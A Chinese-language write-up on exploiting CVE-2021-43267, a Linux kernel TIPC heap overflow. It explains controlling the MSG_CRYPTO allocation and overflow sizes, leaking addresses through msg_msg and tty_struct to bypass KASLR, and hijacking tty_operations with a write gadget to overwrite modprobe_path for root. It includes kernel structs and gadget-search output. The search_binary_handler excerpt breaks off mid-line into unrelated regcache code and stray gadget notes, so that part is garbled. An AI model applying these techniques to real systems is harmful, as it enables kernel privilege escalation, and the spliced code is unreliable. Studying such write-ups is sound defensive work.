**方法** ：前面已经分析过，`MSG_CRYPTO` 消息的堆块分配的size来自 `tipc_msg->msz -tipc_msg->hsz`，`MSG_CRYPTO` 消息的拷贝的size来自 `tipc_aead_key->keylen` 。所以通过控制
`tipc_msg->msz` 即可控制目标堆块的分配大小，控制 `tipc_aead_key->keylen` 即可控制堆块的溢出长度。
    // TIPC 消息:   (&tipc_msg + tipc_msg->hsz) 指向 MSG_CRYPTO 消息
    struct tipc_msg {
        __be32 hdr[15];
    };
    // MSG_CRYPTO 消息
    struct tipc_aead_key {
        char alg_name[TIPC_AEAD_ALG_NAME];
        unsigned int keylen;
        char key[];
    };
**TIPC消息布置如下** ：注意hsz的大小需左移2位，也即乘以4。tipc消息 = `tipc_msg` \+ `tipc_aead_key`。
* * *
## 3\. 绕过KALSR
**泄露对象** ：采用ELOISE提出的`Elastic
Objects`，例如[CVE-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)中也用到过的`msg_msg`。篡改`msg_msg->m_ts`
就能调用 `msgrcv` 进行OOB读。
    /* one msg_msg structure for each message */
    struct msg_msg {
        struct list_head m_list;
        long m_type;
        size_t m_ts;        /* message text size */
        struct msg_msgseg *next;
        void *security;
        /* the actual message follows immediately */
    };
**问题**
：覆写`msg_msg->m_ts`的同时也会覆盖`msg_msg->m_list`，调用`msgrcv`时会将匹配的消息从链表中unlink，如果不正确构造`msg_msg->m_list`就会导致访问崩溃。解决办法是在调用`msgrcv`时传递`MSG_COPY`
flag，避免对目标消息进行unlink。
**思路** ：在空间上布置出 `msg_msg` -> `msg_msg` ->
`interesting_object`，然后释放第1个`msg_msg` ，分配`MSG_CRYPTO`
key堆块占据第1个`msg_msg`，再利用`MSG_CRYPTO` key的溢出来篡改第2个`msg_msg`的`msg_msg->m_ts`，越界读取
`interesting_object` 来泄露内核函数指针。
**victim对象** ：`interesting_object` 选取
`tty_struct`，我们可以通过`magic`值来确认我们泄露的结构是否为有效的`tty_struct`
（预期值为`TTY_MAGIC`-0x5401），`struct tty_operations *ops` 指向内核的`.data`段中某处，也即
[tty_operations](https://elixir.bootlin.com/linux/latest/source/include/linux/tty_driver.h#L247)，可泄露内核基址，绕过KASLR。
**泄露内核基址** ：泄露的`tty_struct`可能属于`master pty`或`slave pty`，所以泄露的地址可能是
`ptm_unix98_ops` 或 `pty_unix98_ops`。
**泄露堆地址** ：泄露 `tty_struct` 也能获得 `tty_struct` 的地址，因为
`tty_struct->ldisc_sem->read_wait->next` 指向 `next`
指针自身。`tty_struct->ldisc_sem->read_wait->next`
的偏移为0x38，减去0x408就是`msg_msg`数据部分的基址。
    struct tty_struct {
        int magic;
        struct kref kref;
        struct device *dev; /* class device or NULL (e.g. ptys, serdev) */
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;
        ...
    }
**堆喷布局如下** ：
* * *
## 4\. 提权
**劫持RIP** ：劫持`tty_operations`。首先喷射一堆`fake
tty_operations`，然后根据上一步释放的堆指针来猜测其中一个`fake tty_operations`的地址。
  * 重复分配`msg_msg`、分配`tty_struct`、释放`msg_msg`、触发TIPC漏洞来覆盖`tty_struct`；
  * 为了确认是否成功覆盖`tty_struct`，可以尝试通过ioctl来调用`tty_struct.ops.ioctl`，如果成功劫持`ops`指针，就能控制RIP，否则调用`close()`关闭pty。
**任意写ROP** ：构造ROP链很难恢复现场，所以决定采用一条gadget来进行任意写。ioctl调用的原型为`int (*ioctl)(struct
tty_struct *tty, unsigned int cmd, unsigned long
arg)`，可控制32位的`cmd`和64位的`arg`参数，也就是`RSI`和`RDX`。任意写的gadget如下所示：本gadget还能将`rax`
清零，便于判断是否成功伪造`tty_operations`并劫持RIP。
    $ objdump -D -j .text ./vmlinux_small \
        | grep -C1 'mov    %rsi,(%rdx)' \
        | grep -B2 ret
    ..
    ffffffff812c51f5:       31 c0                   xor    %eax,%eax
    ffffffff812c51f7:       48 89 32                mov    %rsi,(%rdx)
    ffffffff812c51fa:       c3                      ret
    ..
**提权**
：传统方法是构造任意读和任意写来篡改cred，本文未采用这种方法。本文篡改`modprobe_path`（特权用户可以通过`/proc/sys/kernel/modprobe`来篡改）来执行恶意程序。如果执行一个magic值未知的binary，`request_module`最后会调用`call_modprobe`来发起一个基于`modprobe_path`的modprobe进程。
    /*
     * cycle the list of binary formats handler, until one recognizes the image
     */
    static int search_binary_handler(struct linux_binprm *bprm)
    {
        ..
        if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) lock(map->lock_arg);
        map->cache_dirty = true;
        map->no_sync_defaults = true;
        map->unlock(map->lock_arg);
    }
    EXPORT_SYMBOL_GPL(regcache_mark_dirty);
    // (4) push rdi/rbp/r15      pop rsp       不能破坏tty_struct前8字节(会导致ioctl调用失败)，所以pop rsp之后再pop两次
    john@ubuntu:~/Desktop/tmp/CVE-2021-43267/file$ cat ./g1 | grep "push rdi" | grep "pop rsp"
    0xffffffff8165f1aa: push rdi; add byte ptr [rdi], cl; or ebx, dword ptr [rbx + 0x41]; pop rsp; ret; 
    0xffffffff814a353a: push rdi; add ebx, dword ptr [rbx + 0x41]; pop rsp; pop rbp; ret;  
    john@ubuntu:~/Desktop/tmp/CVE-2021-43267/file$ cat ./g1 | grep "push rbp" | grep "pop rsp"
    0xffffffff81131122: push rbp; add byte ptr [rbp + 0x41], bl; pop rsp; pop r13; ret; 
    0xffffffff81aa41e4: push rbp; add byte ptr [rbp + 0x41], bl; pop rsp; ret; 
    0xffffffff819ea4df: push rbp; cmp byte ptr [rbp + 0x41], bl; pop rsp; pop r13; pop r14; ret; 
    0xffffffff810406a6: push rbp; or byte ptr [rbp + 0x41], bl; pop rsp; ret; 
        // (4) 的问题是找不到 mov cr4, xxx 这个gadget, 从 v5.3.1开始 就不能使用 native_write_cr4() 来修改 cr4 了
    // v5.14.15
    static const unsigned long cr4_pinned_mask =
        X86_CR4_SMEP | X86_CR4_SMAP | X86_CR4_UMIP | X86_CR4_FSGSBASE;
    void native_write_cr4(unsigned long val)
    {
        unsigned long bits_changed = 0;
    set_register:
        asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");
        if (static_branch_likely(&cr_pinning)) {
            if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
                bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
                val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
                goto set_register;
            }
            /* Warn after we've corrected the changed bits. */
            WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
                  bits_changed);
        }
    }
    // v5.2.21
    static inline void native_write_cr4(unsigned long val)
    {
        asm volatile("mov %0,%%cr4": : "r" (val), "m" (__force_order));
    }
* * *
## 参考
[Exploiting CVE-2021-43267](https://haxx.in/posts/pwning-tipc/) — 漏洞利用者
[NVD-CVE-2021-43267-detail](https://nvd.nist.gov/vuln/detail/CVE-2021-43267)
[CVE-2021-43267: Linux TIPC模块任意代码执行漏洞](https://www.4hou.com/posts/K96Y)
[CVE-2021-43267: Remote Linux Kernel Heap Overflow | TIPC Module Allows
Arbitrary Code Execution](https://www.sentinelone.com/labs/tipc-remote-linux-kernel-heap-overflow-allows-arbitrary-code-execution/) — 漏洞发现者
[Transparent Inter Process Communication
Protocol](http://tipc.sourceforge.net/protocol.html) — TIPC协议介绍